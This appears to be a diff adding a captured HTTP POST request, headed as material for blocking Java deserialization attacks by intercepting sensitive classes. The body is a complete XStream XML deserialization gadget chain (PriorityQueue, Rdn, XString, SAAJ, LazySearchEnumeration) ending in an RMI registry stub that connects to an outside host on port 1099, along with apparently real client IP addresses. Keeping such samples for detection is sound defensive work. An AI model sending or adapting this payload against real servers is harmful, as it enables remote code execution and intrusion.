@@ -1,0 +1,72 @@
+# 阻止java反序列化攻击，敏感类拦截
+POST /szzl/xsdzg/ HTTP/1.1
+Host: www.xwd_test.com
+X-Forwarded-Proto: https
+x-real-ip: 2408:4003:103f:6500:7ac0:2e5e:ab34:2820
+X-Forwarded-For: 2408:4003:103f:6500:7ac0:2e5e:ab34:2820, 150.138.220.40
+Connection: Keep-Alive
+Content-Length: 3153
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Cache-Control: max-age=0
+Content-Type: application/xml
+W-Forwarded-Protocol: https
+Client-ip: 192.168.101.11
+
+<java.util.PriorityQueue serialization='custom'>
+    <unserializable-parents/>
+    <java.util.PriorityQueue>
+        <default>
+            <size>2</size>
+        </default>
+        <int>3</int>
+        <javax.naming.ldap.Rdn_-RdnEntry>
+            <type>12345</type>
+            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
+                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
+            </value>
+        </javax.naming.ldap.Rdn_-RdnEntry>
+        <javax.naming.ldap.Rdn_-RdnEntry>
+            <type>12345</type>
+            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
+                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
+                    <parsedMessage>true</parsedMessage>
+                    <soapVersion>SOAP_11</soapVersion>
+                    <bodyParts/>
+                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
+                        <attachmentsInitialized>false</attachmentsInitialized>
+                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
+                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
+                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
+                                    <names>
+                                        <string>aa</string>
+                                        <string>aa</string>
+                                    </names>
+                                    <ctx>
+                                        <environment/>
+                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
+                                            <java.rmi.server.RemoteObject>
+                                                <string>UnicastRef</string>
+                                                <string>1787fr.xun8ts.96f930.pqsdb.homes</string>
+                                                <int>1099</int>
+                                                <long>0</long>
+                                                <int>0</int>
+                                                <long>0</long>
+                                                <short>0</short>
+                                                <boolean>false</boolean>
+                                            </java.rmi.server.RemoteObject>
+                                        </registry>
+                                        <host>1787fr.xun8ts.96f930.pqsdb.homes</host>
+                                        <port>1099</port>
+                                    </ctx>
+                                </candidates>
+                            </aliases>
+                        </nullIter>
+                    </sm>
+                </message>
+            </value>
+        </javax.naming.ldap.Rdn_-RdnEntry>
+    </java.util.PriorityQueue>
+</java.util.PriorityQueue>
